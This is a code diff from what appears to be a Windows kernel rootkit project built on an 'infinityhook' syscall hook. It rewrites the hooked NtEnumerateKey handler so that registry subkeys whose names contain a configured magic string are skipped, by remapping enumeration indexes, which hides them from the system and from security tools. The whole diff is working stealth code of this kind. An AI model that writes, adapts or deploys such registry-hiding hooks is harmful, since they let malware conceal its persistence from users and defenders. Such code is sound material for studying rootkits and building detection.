@@ -40,48 +40,33 @@ NTSTATUS DetourNtEnumerateKey(
 {
 	//kprintf("[+] infinityhook: NtEnumerateKey, class %d, index: %d\n", KeyInformationClass, Index);
 	if (KeyInformationClass == 0) {
-		NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
-		if (NT_SUCCESS(status)) {
-			kprintf("[+] infinityhook: NtEnumerateKey, class %d, index %d, after successful call, ResultLength: %d, KeyHandle: %p\n", KeyInformationClass, Index, *ResultLength, KeyHandle);
-			PKEY_BASIC_INFORMATION KeyBasicInformationPtr = (PKEY_BASIC_INFORMATION)KeyInformation;
-			//kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d\n", KeyBasicInformationPtr->NameLength);
+		// check if the handle contains any keys that should be hidden
+		ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
+		PULONG OkSubkeyIndexesPtr = NULL;
+		NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
+		// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr
 
-			wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-			// ->NameLength / 2 , because the field is size in bytes but contains wchars (which consist of 2 bytes each)
-			for (size_t i = 0; i < KeyBasicInformationPtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
-				NameBuffer[i] = KeyBasicInformationPtr->Name[i];
-			}
-			kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d, Name: %ws\n", KeyBasicInformationPtr->NameLength, NameBuffer);
-			
-			// try to get info about the handle
-			PrintRegistryKeyHandleInformation(KeyHandle, L"NtEnumerateKey");
-
-			// if the key contains 'hideme', change it to 'xideme'
-			/*if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
-				KeyBasicInformationPtr->Name[0] = L'x';
-			}*/
-			
-			// if the key contains 'hideme', return ANOTHER CALL of NtEnumerateKey
-			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
-				kprintf("[+] infinityhook: Should hit RegistryKeyHideInformation\n");
-				ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
-				PULONG OkSubkeyIndexesPtr = NULL;
-				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
-
-				if (!NT_SUCCESS(status)) {
-					// TODO - do something if this fails?
-				}
-
-				kprintf("Okkk indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
-
-				// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr
-				ExFreePool(OkSubkeyIndexesPtr);
-
-				return OriginalNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
-			}
-
+		if (!NT_SUCCESS(status)) {
+			// should not have failed, but we can't do anything without information from this function...
+			// fallback to the original call
+			return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 		}
-		return status;
+
+		kprintf("[+] infinityhook: NtEnumerateKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
+		
+		// there are keys that should be hidden. That means that we want to return
+		// the Index'th subkey of this key (OkSubkeyIndexesPtr[Index])
+		if (HideSubkeyIndexesCount > 0) {
+			ULONG NewIndex = OkSubkeyIndexesPtr[Index];
+			ExFreePool(OkSubkeyIndexesPtr); // free the buffer
+			return OriginalNtEnumerateKey(KeyHandle, NewIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+		}
+		else {
+			// nothing to hide, free the buffer and return the original call
+			ExFreePool(OkSubkeyIndexesPtr);
+			return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+		}
+
 	}
 	else return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 	//else if (KeyInformationClass == 4) {
